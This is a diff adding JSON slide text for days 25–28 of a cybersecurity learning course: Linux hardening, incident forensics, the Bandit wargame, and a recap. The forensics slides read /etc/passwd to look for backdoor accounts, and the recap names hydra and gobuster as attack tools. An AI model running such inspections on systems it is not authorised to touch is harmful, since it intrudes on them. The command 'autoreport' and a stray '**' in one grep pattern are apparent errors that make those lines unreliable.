+        "quote": "Every cloud server you deploy should have SSH hardened within the first 10 minutes of creation. Default SSH configuration is an open invitation — attackers scan the entire internet for port 22 continuously.",
+        "sub": "Never use RSA 1024-bit keys — they are considered cryptographically weak and should be deprecated. Use Ed25519 for new keys — it is faster, shorter, and mathematically stronger than RSA 4096. If you have old RSA keys, replace them with Ed25519 today.",
+        "mistake": "Changing the SSH port and thinking your server is now secure. Port 2222 instead of 22 reduces automated scanning noise — but any targeted attacker runs a full port scan and finds it immediately. Port obfuscation reduces noise, not risk. Real security comes from key-only authentication and fail2ban."
+      }
+    ]
+  },
+
+  {
+    "day": 25,
+    "cover": {
+      "title": "Linux Hardening & __Security Baseline__",
+      "hook": "Default Linux is not secure Linux. Here is how to lock it down.",
+      "tags": ["#Linux", "#Hardening", "#Day25of90"]
+    },
+    "slides": [
+      {
+        "type": "dark",
+        "label": "UFW Firewall",
+        "tag": "Foundation",
+        "method": "WHAT — UFW Configuration",
+        "heading": "UFW: __Uncomplicated Firewall__ Setup",
+        "body": [
+          {"type": "code", "text": "ufw enable                  # Enable firewall"},
+          {"type": "code", "text": "ufw allow 22                # Allow SSH"},
+          {"type": "code", "text": "ufw allow 443               # Allow HTTPS"},
+          {"type": "code", "text": "ufw deny 23                 # Block Telnet"},
+          {"type": "code", "text": "ufw allow from 10.0.0.0/8 to any port 22  # Restrict SSH to LAN"},
+          {"type": "code", "text": "ufw status verbose          # View all rules"},
+          {"type": "code", "text": "ufw delete allow 80         # Remove a rule"},
+          {"type": "para", "text": "**UFW default policy:** Deny all incoming, allow all outgoing. Everything not explicitly allowed is blocked. This is the correct starting position."}
+        ],
+        "pills": [
+          {"text": "UFW", "t": "r"},
+          {"text": "Lynis", "t": "y"},
+          {"text": "auditd", "t": "o"}
+        ],
+        "time": "20 min · LabEx Security Labs · linuxjourney.com"
+      },
+      {
+        "type": "red",
+        "label": "Remove Unnecessary Services",
+        "tag": "Attack Surface Reduction",
+        "method": "WHAT — Minimising the Attack Surface",
+        "heading": "Attack Surface Reduction: __Less = More Secure__",
+        "body": [
+          {"type": "code", "text": "# List all running services:\nsystemctl list-units --type=service --state=running"},
+          {"type": "code", "text": "# Disable unnecessary services:\nsystemctl disable cups      # Printing daemon (server = not needed)\nsystemctl stop cups\nsystemctl disable bluetooth # Bluetooth (server = not needed)\nsystemctl disable avahi-daemon  # mDNS — rarely needed on servers"},
+          {"type": "para", "text": "**Security principle:** Every running service is a potential attack vector. A web server that does not need a print daemon should not have one running. Each unnecessary service is a listening socket, a process, a set of libraries — all potential exploitation points."}
+        ],
+        "time": "20 min · Audit running services on your VM"
+      },
+      {
+        "type": "dark",
+        "label": "Updates & auditd",
+        "tag": "Ongoing Security",
+        "method": "WHAT — Patching and Audit Logging",
+        "heading": "Updates & __auditd__: Patch and Monitor",
+        "body": [
+          {"type": "code", "text": "# Weekly minimum: update and upgrade\napt update && apt upgrade -y"},
+          {"type": "code", "text": "# Enable automatic security patches:\napt install unattended-upgrades\ndpkg-reconfigure unattended-upgrades"},
+          {"type": "code", "text": "# Install and configure auditd:\napt install auditd\n# Monitor passwd file changes:\nauditctl -w /etc/passwd -p wa -k passwd_changes\n# View audit logs:\nauditctl -l      # List active rules\nautoreport       # Summary report"}
+        ],
+        "note": "**60% of breaches exploit known, already-patched vulnerabilities.** Unpatched systems are the easiest targets. Automatic security updates are the single highest-ROI security control available.",
+        "time": "25 min · Enable unattended-upgrades and configure auditd"
+      },
+      {
+        "type": "white",
+        "label": "CIS Benchmarks & Lynis",
+        "tag": "Compliance Tool",
+        "method": "WHAT — Automated Hardening Assessment",
+        "heading": "Lynis & CIS Benchmarks: __Measure Your Security__",
+        "body": [
+          {"type": "para", "text": "**CIS Benchmarks** (Center for Internet Security) provide free, industry-standard security configuration guidelines for every major Linux distribution. Used by enterprises, governments, and cloud providers as the authoritative hardening reference."},
+          {"type": "code", "text": "# Install and run Lynis (automated hardening auditor):\napt install lynis\nsudo lynis audit system"},
+          {"type": "para", "text": "**Lynis produces a hardening score** and lists specific recommendations ordered by priority. A fresh Ubuntu install typically scores 55–65. A properly hardened system should score 75+."},
+          {"type": "para", "text": "**Use Lynis before AND after hardening** — document your score improvement. This is exactly what a junior security engineer does on day one at a new company."}
+        ],
+        "time": "30 min · Install Lynis and run your first audit"
+      },
+      {
+        "type": "yellow",
+        "label": "What to Learn Today",
+        "tag": "What to Learn",
+        "method": "WHAT — Day 25 Learning Targets",
+        "heading": "Day 25 Checklist",
+        "steps": [
+          "Enable **UFW** and configure rules: allow SSH and HTTPS, deny Telnet, verify status",
+          "List all running services and **disable 3 unnecessary ones** with systemctl",
+          "Enable **automatic security updates** with unattended-upgrades",
+          "Install **auditd** and add a rule to monitor /etc/passwd — verify it captures changes",
+          "Run **Lynis audit** — record your starting score and top 3 recommendations"
+        ],
+        "time": "Total Day 25 Study Time: 90 – 120 minutes"
+      },
+      {
+        "type": "resources_white",
+        "label": "Where to Learn",
+        "tag": "Free Resources",
+        "method": "WHERE — Best Resources for Day 25",
+        "heading": "Free Resources for __Today__",
+        "resources": [
+          {"label": "📖 Benchmarks", "name": "CIS Benchmarks — Free Linux Security Baselines", "url": "cisecurity.org/benchmarks"},
+          {"label": "🔧 Tool", "name": "Lynis — Free Linux Security Auditing Tool", "url": "cisofy.com/lynis"},
+          {"label": "🧪 Lab", "name": "LabEx — Linux Security Hardening Labs (free)", "url": "labex.io/free-labs/linux"},
+          {"label": "📖 Tool", "name": "OpenSCAP — Automated Compliance Scanning", "url": "open-scap.org"}
+        ]
+      },
+      {
+        "type": "white",
+        "label": "Action Plan",
+        "tag": "How to Learn",
+        "method": "HOW — Step-by-Step for Day 25",
+        "heading": "Your Hands-On __Task__ for Day 25",
+        "steps": [
+          "**Install Lynis:** `sudo apt install lynis` then run `sudo lynis audit system`",
+          "**Record** your hardening score — this is your baseline",
+          "**Implement** 3 recommendations from the Lynis report — re-run Lynis and see your score improve",
+          "**Enable UFW** and configure rules for your specific use case — verify with `ufw status verbose`"
+        ],
+        "time": "Hands-On Task: 60 – 90 minutes"
+      },
+      {
+        "type": "quote",
+        "label": "Pro Tip",
+        "tag": "Pro Tip · Day 25",
+        "quote": "Run Lynis before AND after hardening. Document your score improvement. This is exactly what a security engineer's job looks like on day one at any company.",
+        "sub": "Download the CIS Benchmark PDF for Ubuntu from cisecurity.org — it is free with a registration. This document contains hundreds of specific hardening settings with rationale for each. Reading one section per day gives you a comprehensive security education that formal courses charge thousands for.",
+        "mistake": "Blindly applying all hardening recommendations without testing. Some CIS Benchmark settings break application functionality. Always test hardening changes in a lab environment first. Document every change made. Have a rollback plan before applying any hardening to production systems."
+      }
+    ]
+  },
+
+  {
+    "day": 26,
+    "cover": {
+      "title": "Linux __Forensics__ Fundamentals",
+      "hook": "After an attack — where do you look? Linux forensics 101.",
+      "tags": ["#Linux", "#Forensics", "#Day26of90"]
+    },
+    "slides": [
+      {
+        "type": "dark",
+        "label": "Volatile Data First",
+        "tag": "Foundation",
+        "method": "WHAT — Forensics Order of Operations",
+        "heading": "Volatile Data: __Collect Before It Disappears__",
+        "body": [
+          {"type": "para", "text": "**Volatile data** exists only in RAM and active system state — it is permanently lost on reboot. In any Linux incident response, collecting volatile data is the FIRST action — before any other analysis."},
+          {"type": "code", "text": "whoami && id                # Who are we running as?\nps aux                      # All running processes\nss -tulnp                   # All network connections\nnetstat -anp                # Alternative network view\nlsof -i                     # Open files and network connections\nlastlog                     # Recent login history\nw                           # Who is currently logged in?"}
+        ],
+        "pills": [
+          {"text": "Volatile Data", "t": "r"},
+          {"text": "Persistence", "t": "y"},
+          {"text": "rkhunter", "t": "o"}
+        ],
+        "time": "25 min · SANS Linux Forensics Cheat Sheet (free PDF)"
+      },
+      {
+        "type": "red",
+        "label": "Checking Persistence",
+        "tag": "Attacker Persistence",
+        "method": "WHAT — Where Malware Hides for Persistence",
+        "heading": "Persistence: __Where Malware Hides__",
+        "body": [
+          {"type": "code", "text": "# Check all cron locations:\ncrontab -l\nsudo crontab -l -u root\ncat /etc/crontab\nls -la /etc/cron.d/ /etc/cron.daily/"},
+          {"type": "code", "text": "# Check startup services:\nsystemctl list-units --type=service --state=running\nls /etc/init.d/\ncat /etc/rc.local"},
+          {"type": "code", "text": "# Check for new user accounts (backdoor users):\ncat /etc/passwd | grep -v nologin\ngrep ':0:' /etc/passwd        # UID 0 = root privileges\nlastlog | grep -v '**Never logged'"},
+          {"type": "para", "text": "**Persistence locations are predictable.** Professional attackers plant backdoors in all these locations simultaneously — you must check every one of them."}
+        ],
+        "time": "25 min · TryHackMe 'Linux Forensics' Room"
+      },
+      {
+        "type": "dark",
+        "label": "File System Timeline",
+        "tag": "Timeline Analysis",
+        "method": "HOW — Finding Recent Changes",
+        "heading": "File System __Timeline__ Analysis",
+        "body": [
+          {"type": "code", "text": "# Find files modified in the last 24 hours:\nfind / -mtime -1 -type f 2>/dev/null"},
+          {"type": "code", "text": "# Files modified more recently than a reference file:\nfind / -newer /etc/hostname -type f 2>/dev/null"},
+          {"type": "code", "text": "# Recently modified web files (webshell detection!):\nls -lt /var/www/html | head -20"},
+          {"type": "code", "text": "# View all timestamps for a specific file:\nstat /var/www/html/suspicious.php"},
+          {"type": "code", "text": "# Find files modified in /etc (config tampering):\nfind /etc -newer /etc/hostname -type f 2>/dev/null"}
+        ],
+        "time": "20 min · Practise timeline analysis on your Linux VM"
+      },
+      {
+        "type": "white",
+        "label": "Rootkit Detection",
+        "tag": "Malware Detection",
+        "method": "WHAT — Scanning for Rootkits",
+        "heading": "Rootkit Detection: __rkhunter & chkrootkit__",
+        "body": [
+          {"type": "code", "text": "# Install rootkit scanners:\nsudo apt install rkhunter chkrootkit"},
+          {"type": "code", "text": "# Update rkhunter database:\nsudo rkhunter --update"},
+          {"type": "code", "text": "# Run rkhunter scan:\nsudo rkhunter --check"},
+          {"type": "code", "text": "# Run chkrootkit:\nsudo chkrootkit"},
+          {"type": "para", "text": "**Important limitation:** Rootkits can hide from these tools by manipulating the very kernel calls they use. A result of 'clean' from rkhunter does NOT guarantee a system is rootkit-free. Forensics professionals use offline analysis tools (booting from trusted media) for definitive rootkit detection."}
+        ],
+        "time": "25 min · Install and run both tools — review all warnings"
+      },
+      {
+        "type": "yellow",
+        "label": "What to Learn Today",
+        "tag": "What to Learn",
+        "method": "WHAT — Day 26 Learning Targets",
+        "heading": "Day 26 Checklist",
+        "steps": [
+          "Understand **volatile data collection order** — why you collect before any other analysis",
+          "Check **all persistence locations** on your VM — cron, startup, /etc/passwd for backdoor accounts",
+          "Find **recently modified files** with `find / -mtime -1` — note anything unexpected",
+          "Install and run **rkhunter** — review every warning in the output",
+          "Understand the **limitation of rootkit scanners** — why offline analysis is the gold standard"
+        ],
+        "time": "Total Day 26 Study Time: 90 – 120 minutes"
+      },
+      {
+        "type": "resources_white",
+        "label": "Where to Learn",
+        "tag": "Free Resources",
+        "method": "WHERE — Best Resources for Day 26",
+        "heading": "Free Resources for __Today__",
+        "resources": [
+          {"label": "🧪 Lab", "name": "TryHackMe — 'Linux Forensics' Room (free)", "url": "tryhackme.com/room/linuxforensics"},
+          {"label": "📄 Poster", "name": "SANS — Linux Forensics Reference Poster (free PDF)", "url": "sans.org/posters"},
+          {"label": "🔧 Tool", "name": "Autopsy — Free Digital Forensics Platform", "url": "sleuthkit.org/autopsy"},
+          {"label": "📺 Video", "name": "13Cubed — Linux Forensics YouTube Channel (free)", "url": "youtube.com/c/13Cubed"}
+        ]
+      },
+      {
+        "type": "white",
+        "label": "Action Plan",
+        "tag": "How to Learn",
+        "method": "HOW — Step-by-Step for Day 26",
+        "heading": "Your Hands-On __Task__ for Day 26",
+        "steps": [
+          "**Install** rkhunter: `sudo apt install rkhunter` — run `sudo rkhunter --check` and review output",
+          "**Check** recently modified files in /etc: `find /etc -newer /etc/hostname -type f 2>/dev/null`",
+          "**Audit** all cron locations — document every job found and determine if each is legitimate",
+          "**Complete** TryHackMe 'Linux Forensics' room — apply all today's techniques in a lab scenario"
+        ],
+        "time": "Hands-On Task: 60 – 90 minutes"
+      },
+      {
+        "type": "quote",
+        "label": "Pro Tip",
+        "tag": "Pro Tip · Day 26",
+        "quote": "Forensics means evidence preservation above all else. Never modify a compromised system before collecting volatile data. In a real incident: photograph the screen first, then begin collection.",
+        "sub": "The order of forensic collection follows volatility — most volatile data first. RAM contents → network connections → running processes → open files → logged-in users → system configuration → persistent storage. This order is the same in every professional DFIR engagement regardless of company or industry.",
+        "mistake": "Shutting down a compromised system before collecting volatile data. RAM is wiped on shutdown — you permanently lose running processes, network connections, encryption keys held in memory, and any data the attacker was actively working with. In forensics, a hasty shutdown can cost you the entire investigation."
+      }
+    ]
+  },
+
+  {
+    "day": 27,
+    "cover": {
+      "title": "OverTheWire Bandit: __Linux CTF__",
+      "hook": "Level up your Linux with the best free CTF for beginners: Bandit.",
+      "tags": ["#Linux", "#CTF", "#Day27of90"]
+    },
+    "slides": [
+      {
+        "type": "dark",
+        "label": "What is OverTheWire Bandit?",
+        "tag": "Foundation",
+        "method": "WHAT — Bandit CTF Overview",
+        "heading": "Bandit: The __Best Free__ Linux Wargame",
+        "body": [
+          {"type": "para", "text": "**OverTheWire Bandit** is a free, browser-accessible Linux wargame with 34 progressively challenging levels. Each level teaches a specific Linux skill through a puzzle that requires finding a password hidden on the system."},
+          {"type": "para", "text": "**No setup required.** You connect to their server via SSH: `ssh bandit0@bandit.labs.overthewire.org -p 2220`. The password for level 0 is: bandit0. From there, every level's password unlocks the next."},
+          {"type": "para", "text": "**Why Bandit works:** Instead of reading about commands, you are forced to USE them under pressure to solve real problems. This is how professional skills are actually built — not through passive study."}
+        ],
+        "pills": [
+          {"text": "CTF", "t": "r"},
+          {"text": "Bandit", "t": "y"},
+          {"text": "Wargame", "t": "o"}
+        ],
+        "time": "Start at overthewire.org/wargames/bandit"
+      },
+      {
+        "type": "red",
+        "label": "Levels 0–5",
+        "tag": "Beginner Levels",
+        "method": "WHAT — Bandit Levels 0 to 5",
+        "heading": "Bandit __Levels 0–5__: Basic Navigation",
+        "body": [
+          {"type": "bullet", "text": "**Level 0:** Connect via SSH using provided credentials — introduces basic SSH client usage from Days 15 and 24."},
+          {"type": "bullet", "text": "**Level 1:** Read a file named `-` — requires knowing how to handle special filenames with `cat ./-`."},
+          {"type": "bullet", "text": "**Level 2:** Read a file with spaces in the filename — requires quoting: `cat 'spaces in name'`."},
+          {"type": "bullet", "text": "**Level 3:** Find a hidden file in a directory — uses `ls -la` to reveal dot files."},
+          {"type": "bullet", "text": "**Level 4:** Find the only human-readable file — uses `file` command to identify file types."},
+          {"type": "bullet", "text": "**Level 5:** Find a file with specific properties — uses `find` with multiple flags simultaneously."}
+        ],
+        "time": "30–45 min · Complete Levels 0–5 before reading further"
+      },
+      {
+        "type": "dark",
+        "label": "Levels 6–10",
+        "tag": "Intermediate Levels",
+        "method": "WHAT — Bandit Levels 6 to 10",
+        "heading": "Bandit __Levels 6–10__: Text Processing",
+        "body": [
+          {"type": "bullet", "text": "**Level 6:** Find file by owner, size, and group — advanced `find` with `-user`, `-group`, `-size` flags."},
+          {"type": "bullet", "text": "**Level 7:** Search for a word in a large file — uses `grep` to find 'millionth' in a massive data file."},
+          {"type": "bullet", "text": "**Level 8:** Find the unique line in a file — uses `sort | uniq -u` to find the line appearing only once."},
+          {"type": "bullet", "text": "**Level 9:** Find human-readable strings preceded by = — uses `strings` command on binary file."},
+          {"type": "bullet", "text": "**Level 10:** Base64-encoded data — uses `base64 --decode` to reveal the password."}
+        ],
+        "time": "45–60 min · Complete Levels 6–10"
+      },
+      {
+        "type": "white",
+        "label": "Levels 11–15",
+        "tag": "Advanced Levels",
+        "method": "WHAT — Bandit Levels 11 to 15",
+        "heading": "Bandit __Levels 11–15__: Real-World Skills",
+        "body": [
+          {"type": "bullet", "text": "**Level 11:** ROT13 cipher — uses `tr` command for character substitution to decode the password."},
+          {"type": "bullet", "text": "**Level 12:** Hexdump with nested compression — uses xxd, gzip, bzip2, tar to decompress layered archive."},
+          {"type": "bullet", "text": "**Level 13:** SSH private key authentication — uses `ssh -i` flag with a provided keyfile to connect to next level."},
+          {"type": "bullet", "text": "**Level 14:** Connect to local port for password — uses netcat to connect to localhost:30000."},
+          {"type": "bullet", "text": "**Level 15:** SSL/TLS encrypted connection — uses openssl s_client to communicate with SSL-wrapped port."}
+        ],
+        "time": "60–90 min · Levels 11–15 are significantly harder — persist through them"
+      },
+      {
+        "type": "yellow",
+        "label": "What to Learn Today",
+        "tag": "What to Learn",
+        "method": "WHAT — Day 27 Learning Targets",
+        "heading": "Day 27 Checklist",
+        "steps": [
+          "**Connect** to Bandit Level 0 via SSH — `ssh bandit0@bandit.labs.overthewire.org -p 2220`",
+          "**Complete** Levels 0 through 5 — document every command used in a notes file",
+          "**Attempt** Levels 6–10 — try each for 10–15 minutes before consulting documentation",
+          "Understand **why CTFs build skills faster** than tutorials — active vs passive learning",
+          "**Push** to the highest level you can reach — share your progress in the comments"
+        ],
+        "time": "Total Day 27 Study Time: 120 – 180 minutes (CTF days run longer)"
+      },
+      {
+        "type": "resources_white",
+        "label": "Where to Learn",
+        "tag": "Free Resources",
+        "method": "WHERE — Best CTF Resources",
+        "heading": "Free CTF Resources for __Today__",
+        "resources": [
+          {"label": "🎮 Primary", "name": "OverTheWire Bandit — Free Linux Wargame", "url": "overthewire.org/wargames/bandit"},
+          {"label": "🎮 Beginner", "name": "PicoCTF — Perfect for Absolute Beginners (free)", "url": "picoctf.org"},
+          {"label": "🧪 Guided", "name": "TryHackMe — Beginner-Friendly CTF Rooms (free)", "url": "tryhackme.com"},
+          {"label": "🏆 Advanced", "name": "HackTheBox — Realistic Pentest Machines (free tier)", "url": "hackthebox.com"}
+        ]
+      },
+      {
+        "type": "white",
+        "label": "Action Plan",
+        "tag": "How to Learn",
+        "method": "HOW — Step-by-Step for Day 27",
+        "heading": "Your Hands-On __Task__ for Day 27",
+        "steps": [
+          "**Connect** to Bandit: `ssh bandit0@bandit.labs.overthewire.org -p 2220` — password: bandit0",
+          "**Complete** Levels 0–5 — document each command and why it worked in a notes file",
+          "**Push further** — attempt Levels 6–10 — struggle for 10 minutes before looking up hints",
+          "**Share** your highest level in comments — community accountability drives progress"
+        ],
+        "time": "Hands-On Task: 90 – 150 minutes"
+      },
+      {
+        "type": "quote",
+        "label": "Pro Tip",
+        "tag": "Pro Tip · Day 27",
+        "quote": "Do not look at walkthroughs immediately. Struggle for 10–15 minutes first. The frustration is the learning — it forces your brain to form lasting memory connections that reading never creates.",
+        "sub": "Top SOC analysts and penetration testers universally credit CTF practice as the biggest accelerator of their technical skills. Not courses. Not videos. CTFs. The combination of a real problem, a deadline, and competitive pressure creates learning that no other method replicates.",
+        "mistake": "Using CTF walkthroughs as a reading exercise. Looking up the answer immediately teaches you how to read — not how to hack. If you use a walkthrough, close it, wait 10 minutes, then reproduce the solution from memory using only your notes. The reproduction, not the reading, is where learning occurs."
+      }
+    ]
+  },
+
+  {
+    "day": 28,
+    "cover": {
+      "title": "Linux Mastery Week __Recap__ & Challenge",
+      "hook": "4 weeks done. You are now dangerous on Linux. Let us review what you have built.",
+      "tags": ["#Linux", "#Recap", "#Day28of90"]
+    },
+    "slides": [
+      {
+        "type": "dark",
+        "label": "Linux Mastery Recap",
+        "tag": "Summary",
+        "method": "WHAT — 14 Days of Linux Covered",
+        "heading": "14 Days of Linux: __Everything You Built__",
+        "body": [
+          {"type": "bullet", "text": "**Days 15–16:** Linux intro, filesystem structure, 15 core navigation and file operation commands"},
+          {"type": "bullet", "text": "**Days 17–18:** File permissions (rwx/SUID/sticky bit), user management, grep/awk/sed text processing"},
+          {"type": "bullet", "text": "**Days 19–20:** Networking tools (ss/ip/netcat/curl), Bash scripting (variables/loops/functions)"},
+          {"type": "bullet", "text": "**Days 21–22:** Process monitoring (ps/htop/cron), log analysis (auth.log, journalctl, brute-force detection)"},
+          {"type": "bullet", "text": "**Days 23–24:** Package management (apt/yum/pip), SSH hardening (keys, sshd_config, fail2ban)"},
+          {"type": "bullet", "text": "**Days 25–26:** Linux hardening (UFW/Lynis/CIS benchmarks), forensics (volatile data, persistence, rkhunter)"},
+          {"type": "bullet", "text": "**Day 27:** OverTheWire Bandit CTF — applied all skills under real challenge conditions"}
+        ],
+        "pills": [
+          {"text": "Recap", "t": "r"},
+          {"text": "Challenge", "t": "y"},
+          {"text": "Next: Python", "t": "o"}
+        ],
+        "time": "45 min · Review all 14 days of notes"
+      },
+      {
+        "type": "red",
+        "label": "Your Linux Toolkit",
+        "tag": "Installed Tools",
+        "method": "WHAT — Tools Built This Phase",
+        "heading": "Your Linux __Security Toolkit__",
+        "body": [
+          {"type": "bullet", "text": "**Network tools:** nmap, netcat, ss, ip, curl, wget, mtr — for scanning and connectivity testing"},
+          {"type": "bullet", "text": "**Analysis tools:** grep, awk, sed — for log analysis and data extraction at any scale"},
+          {"type": "bullet", "text": "**Security tools:** fail2ban, ufw, auditd, rkhunter, lynis — for hardening and monitoring"},
+          {"type": "bullet", "text": "**Exploitation tools:** hydra, gobuster, wireshark — for authorised security assessments"},
+          {"type": "bullet", "text": "**Scripting:** Bash — for automating reconnaissance, enumeration, and reporting workflows"},
+          {"type": "para", "text": "Every tool above is either pre-installed on Kali Linux or available via `apt install` in seconds. You now have a working security toolkit and know how to use each component."}
+        ],
+        "time": "20 min · Verify all tools are installed: tool --version for each"
+      },
+      {
+        "type": "dark",
+        "label": "Complete These Resources",
+        "tag": "Resources",
+        "method": "WHERE — Complete These If Not Done",
+        "heading": "Complete These If __Not Done Yet__",
+        "body": [
+          {"type": "bullet", "text": "**Cisco Linux Unhatched** (free on netacad.com) — official Linux certification-aligned content — 8–10 hours total. Essential completion before Day 29."},
+          {"type": "bullet", "text": "**LabEx Free Linux Labs** (labex.io/free-labs/linux) — browser-based hands-on labs for every topic covered this phase. Each lab 15–30 minutes. No setup required."},
+          {"type": "bullet", "text": "**TryHackMe Linux Fundamentals** (Parts 1–3) — guided rooms that walk through filesystem, permissions, processes, and log analysis with lab environments."},
+          {"type": "bullet", "text": "**OverTheWire Bandit** — continue from wherever you left off. Aim for Level 15 minimum. Each level teaches a skill directly applicable to real security work."}
+        ],
+        "time": "Complete any outstanding resources before moving to Python phase"
+      },
+      {
+        "type": "white",
+        "label": "Linux Certifications",
+        "tag": "Career Path",
+        "method": "WHY — Linux Certification Value",
+        "heading": "Linux __Certifications__ for Your Career",
+        "steps": [
+          "**CompTIA Linux+** — vendor-neutral, recognised globally. Covers both Debian and RHEL commands. Directly matches what you learned this phase. Intermediate difficulty.",
+          "**LPIC-1 (Linux Professional Institute)** — more detailed than Linux+. Two exams (101 and 102). Strong in Europe and international markets. Foundation you built = exam ready.",
+          "**Red Hat RHCSA** — performance-based exam on a live RHEL system. No multiple choice — you must complete real tasks. Most respected Linux certification in enterprise environments.",
+          "**RHCE (Red Hat Certified Engineer)** — advanced RHCSA. Automation with Ansible. Senior-level. 15–25% salary premium for Linux-focused roles with RHCE.",
+          "**Timeline recommendation:** Linux+ first, then LPIC-1, then RHCSA after gaining 6+ months of real Linux experience."
+        ],
+        "time": "Read: Compare Linux certification paths on reddit.com/r/linuxadmin"
+      },
+      {
+        "type": "yellow",
+        "label": "Final Linux Challenge",
+        "tag": "Capstone",
+        "method": "HOW — Build the System Audit Script",
+        "heading": "Final Linux __Challenge__: System Audit Script",
+        "steps": [
+          "**Build** a complete Bash system audit script — approximately 30 lines",
+          "**Include:** hostname, current IP addresses (`ip a`), open listening ports (`ss -tulnp`)",
+          "**Include:** top 10 processes by CPU (`ps aux --sort=-%cpu | head -10`)",
+          "**Include:** recent authentication failures from auth.log (`grep -c 'Failed' /var/log/auth.log`)",
+          "**Include:** all SUID binaries (`find / -perm -4000 2>/dev/null`)",
+          "**Include:** files modified in the last 24 hours (`find / -mtime -1 -type f 2>/dev/null | head -20`)",
+          "**Output** everything to a timestamped report file — `audit_$(date +%Y%m%d).txt`"
+        ],
+        "time": "Final Challenge: 60 – 90 minutes to complete"
+      },
+      {
+        "type": "resources_white",
+        "label": "Resources to Complete",
+        "tag": "Completion Resources",
+        "method": "WHERE — Final Linux Resources",
+        "heading": "Free Resources to __Complete__ This Phase",
+        "resources": [
+          {"label": "📖 Course", "name": "Cisco NetAcad — Linux Unhatched (free, complete now)", "url": "netacad.com/courses/linux-unhatched"},
+          {"label": "🧪 Labs", "name": "LabEx — Complete All Free Linux Labs", "url": "labex.io/free-labs/linux"},
+          {"label": "🎮 CTF", "name": "OverTheWire Bandit — Continue from your highest level", "url": "overthewire.org/wargames/bandit"},
+          {"label": "🧪 Module", "name": "TryHackMe — Linux Fundamentals Module (all 3 parts)", "url": "tryhackme.com/module/linux-fundamentals"}
+        ]
+      },
+      {
+        "type": "white",
+        "label": "Action Plan",
+        "tag": "How to Complete",
+        "method": "HOW — Step-by-Step for Day 28",
+        "heading": "Your __Final Linux__ Task",
+        "steps": [
+          "**Build** the 30-line system audit Bash script — every section listed in the challenge above",
+          "**Test** it on your Linux VM — verify every section of the output is accurate",
+          "**Save** it as `system_audit.sh` in your security toolkit directory",
+          "**Post** your biggest Linux win from the past 14 days with #Day28of90 — share your progress"
+        ],
+        "time": "Hands-On Task: 60 – 90 minutes"
+      },
+      {
+        "type": "stats",
+        "label": "Month 1 Complete",
+        "tag": "Progress Stats",
+        "method": "WHY — The Value of Month 1",
+        "heading": "Month 1 __Complete__ — Your Progress",
+        "stats": [
+          {"value": "28", "label": "Days of consistent learning — not one missed"},
+          {"value": "14", "label": "Days of Linux mastery — filesystem to forensics"},
+          {"value": "10+", "label": "Security tools installed and actively used"},
+          {"value": "62", "label": "Days remaining — Python starts tomorrow"}
+        ]
+      },
+      {
+        "type": "quote",
+        "label": "Pro Tip",
+        "tag": "Pro Tip · Day 28",
+        "quote": "The best way to deepen Linux skills from here: build a home lab with 2–3 VMs. Set one as an attacker and practice attacking and defending the others. This is how elite analysts train.",
+        "sub": "Python starts Day 29 — and your Linux foundation makes it dramatically more powerful. Every Python security tool you write will leverage the Linux commands you learned this phase. grep becomes subprocess calls. Bash loops become Python loops. The phases build on each other deliberately.",
+        "mistake": "Thinking Linux mastery ends at Day 28. Linux is a career-long learning journey. Every new tool, every new CTF, every new incident teaches you something new about Linux internals. The difference between a beginner and an expert is not what they know — it is how many years they have been learning daily."
+      }
+    ]
+  }
+]
